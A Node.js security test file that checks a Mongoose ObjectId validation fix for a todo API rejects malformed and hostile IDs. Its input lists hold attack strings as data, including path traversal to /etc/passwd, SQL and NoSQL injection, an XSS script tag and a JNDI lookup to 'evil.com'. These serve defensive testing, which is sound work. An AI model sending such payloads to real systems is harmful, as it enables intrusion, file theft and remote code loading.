#!/usr/bin/env node
/**
 * Minimal security test for ObjectId validation fix
 * Can be run directly with: node test/minimal-security.test.js
 */

const mongoose = require('mongoose');
const assert = require('assert');

console.log('Running security tests for ObjectId validation fix...\n');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`✓ ${name}`);
    passed++;
  } catch (err) {
    console.log(`✗ ${name}`);
    console.log(`  Error: ${err.message}`);
    failed++;
  }
}

// Test 1: Malformed IDs should be rejected
test('Malformed ObjectId should be rejected', () => {
  const malformedIds = [
    'invalid-id',
    '12345',
    '../../../etc/passwd',
    '"; DROP TABLE todos; --',
    '{ $ne: null }',
    '<script>alert("xss")</script>'
  ];
  
  malformedIds.forEach(id => {
    const isValid = mongoose.Types.ObjectId.isValid(id);
    assert.strictEqual(isValid, false, `Should reject: ${id}`);
  });
});

// Test 2: Valid IDs should be accepted
test('Valid ObjectId should be accepted', () => {
  const validIds = [
    '507f1f77bcf86cd799439011',
    '507f191e810c19729de860ea',
    '5f8d0d55b54764421b7156c9'
  ];
  
  validIds.forEach(id => {
    const isValid = mongoose.Types.ObjectId.isValid(id);
    assert.strictEqual(isValid, true, `Should accept: ${id}`);
  });
});

// Test 3: Null document check doesn't throw
test('Null document check should not throw', () => {
  const handleDocument = (doc) => {
    if (!doc) {
      return 404;
    }
    return 200;
  };
  
  const result = handleDocument(null);
  assert.strictEqual(result, 404, 'Should return 404 for null document');
});

// Test 4: Error handling flow
test('Error should be forwarded to next()', () => {
  const dbError = new Error('Database error');
  let errorForwarded = false;
  
  const handleError = (err, next) => {
    if (err) {
      next(err);
      return true;
    }
    return false;
  };
  
  const next = (err) => {
    errorForwarded = true;
    assert.strictEqual(err, dbError);
  };
  
  handleError(dbError, next);
  assert.strictEqual(errorForwarded, true, 'Error should be forwarded');
});

// Test 5: Simulate the fixed update handler logic
test('Fixed update handler should validate ID first', () => {
  const simulateFixedHandler = (id) => {
    // Step 1: Validate ObjectId format (THE FIX)
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return { status: 400, message: 'Invalid ID format' };
    }
    
    // Step 2: Simulate database callback
    const todo = null; // Simulate not found
    
    // Step 3: Check if document exists (THE FIX)
    if (!todo) {
      return { status: 404, message: 'Todo not found' };
    }
    
    // Step 4: Safe to update
    return { status: 200, message: 'Updated' };
  };
  
  // Test with malformed ID
  const result1 = simulateFixedHandler('invalid-id');
  assert.strictEqual(result1.status, 400, 'Should return 400 for malformed ID');
  
  // Test with valid but non-existent ID
  const result2 = simulateFixedHandler('507f1f77bcf86cd799439011');
  assert.strictEqual(result2.status, 404, 'Should return 404 for non-existent ID');
});

// Test 6: Verify no uncaught exceptions
test('No uncaught exceptions should be thrown', () => {
  const simulateVulnerableCode = (todo) => {
    // This would throw TypeError if todo is null (VULNERABLE)
    // return todo.content = 'new content';
    
    // Fixed version:
    if (!todo) {
      throw new Error('Expected: should handle null');
    }
    return todo.content = 'new content';
  };
  
  // Should not throw uncaught exception
  try {
    simulateVulnerableCode(null);
    assert.fail('Should have thrown controlled error');
  } catch (err) {
    assert.strictEqual(err.message, 'Expected: should handle null');
  }
});

// Test 7: Injection prevention
test('SQL/NoSQL injection attempts should be rejected', () => {
  const injectionAttempts = [
    '"; DROP TABLE todos; --',
    '{ $ne: null }',
    '../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '\'OR\'1\'=\'1'
  ];
  
  injectionAttempts.forEach(maliciousId => {
    const isValid = mongoose.Types.ObjectId.isValid(maliciousId);
    assert.strictEqual(isValid, false, `Should reject injection: ${maliciousId}`);
  });
});

// Summary
console.log(`\n${'='.repeat(50)}`);
console.log(`Tests passed: ${passed}`);
console.log(`Tests failed: ${failed}`);
console.log(`${'='.repeat(50)}`);

if (failed > 0) {
  process.exit(1);
} else {
  console.log('\n✓ All security tests passed!');
  process.exit(0);
}
